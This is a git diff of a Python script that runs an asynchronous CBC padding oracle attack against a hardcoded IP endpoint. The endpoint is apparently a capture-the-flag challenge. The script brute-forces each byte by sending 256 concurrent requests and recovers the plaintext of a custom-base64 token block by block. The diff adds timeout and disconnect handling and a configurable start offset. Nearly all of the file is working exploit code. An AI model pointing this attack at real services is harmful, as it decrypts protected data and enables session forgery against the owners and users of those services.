@@ -5,12 +5,15 @@ import aiohttp
 import asyncio
 import requests
 
-logging.basicConfig(level=logging.INFO)
-URL_PREF="http://35.237.57.141:5001/03f0355e03/?post="
-msg = "1azZquGGv73tMUCz0zEqG21RuJYJgqqyPUbgakNCCeXZD5xdwbIx0uIh7bSoawqwiR9dLNSt!X0RZ0AGLN38tu!Qwh9tIHfQTvZMA4JCQvj3QLu0JPKozkPYtC1azrS723NHCKFZmqrBuXHG2-Jegj9wRkI9CESo9dY7kZHwZa!OCqg9ofJTRPZ-Yx4b5x5Dcbwg9YSlwQAf1YWeLXlusQ~~"
 
+logging.basicConfig(level = logging.INFO)
+URL_PREF = "http://35.237.57.141:5001/03f0355e03/?post="
+msg = "zI0fzeLxs01XCW9ZKnwmNqeiNRCdKcMFfrt3ESmCqhS-2RD9JSHV69owUadenvQvxNCHnsuIrZfJUe2FlkhqUVS0DjltwIm2hrXeTnXYFFdW9LxENA0j-nxfTdD9m9qhs!m-ezLmqvRBbJ0fQJ2RkZeNOhC1OPchAbkFdiAFHHkcRE8-hDGFkjl9JpSmt2CNV0qAZFt5ikYXTJS5OYM7tQ~~"
+#for decrypt full msg, set DATA_START to 0
+DATA_START = 16*6#16*6  #len(iv)+len(data)=16 + 144 = 160 = len(decode(msg))
 
 b64d = lambda x: base64.b64decode(x.replace('~', '=').replace('!', '/').replace('-', '+'))
+
 
 
 timeout=aiohttp.ClientTimeout(total=60)
@@ -45,7 +48,7 @@ async def fetch(session, i, url):
 
 async def main(pad,prefix,suffix):
 
-    logging.info("bruting {} byte".format(pad))
+    logging.info("bruting {}/16 byte".format(pad))
     tasks = []
     async with aiohttp.ClientSession(timeout=timeout) as session:
         for i in range(0, 256):
@@ -65,10 +68,10 @@ async def main(pad,prefix,suffix):
 
 if __name__ == '__main__':
     data = b64d(msg)
-    data_list = [data[i:i + 32] for i in range(0, len(data) - 16+1, 16)]
+    data_list = [data[i:i + 32] for i in range(DATA_START, len(data) - 32 + 1, 16)]
     #data = data[-32:]
     res_buf = b""
-    for data in data_list:
+    for block_n, data in enumerate(data_list,1):
         data_for_decrypt = data[16:]
         iv_orig = data[:16]
 
@@ -87,7 +90,12 @@ if __name__ == '__main__':
                     future = asyncio.ensure_future(main(pad, prefix, suffix))
                     loop.run_until_complete(future)
 
-                    logging.info("loop ended pad: {}".format(pad))
+                    logging.debug("loop ended pad: {}".format(pad))
+
+                    if len(res)==0:
+                        last_pad=16
+                        print("bruting ended? something went wrong")
+                        break
 
                     while len(res) > 1:
                         for k in res:
@@ -102,10 +110,12 @@ if __name__ == '__main__':
                     internal_state[16 - pad] = res[0] ^ pad
                     last_state[16-pad] = res[0] ^ pad
                     last_pad = pad
-            except:
-                print("err in {} pad, start with {}".format(last_pad, last_pad))
+            except asyncio.TimeoutError: #обожаю МТС
+                logging.info("Timeout error, start bruting from {} byte".format(last_pad))
+            except aiohttp.client_exceptions.ServerDisconnectedError:
+                logging.info("ServerDisconnectedError? WTF? start bruting from {} byte".format(last_pad))
 
-        print("result: ", decrypt_xor(iv_orig, bytes(internal_state)), get_vect_by_pad(0))
+        logging.info(" block {}/{} restored,  result: {}".format(block_n,len(data_list),str(decrypt_xor(iv_orig, bytes(internal_state)))))
         res_buf += decrypt_xor(iv_orig, bytes(internal_state))
 
     print(res_buf)
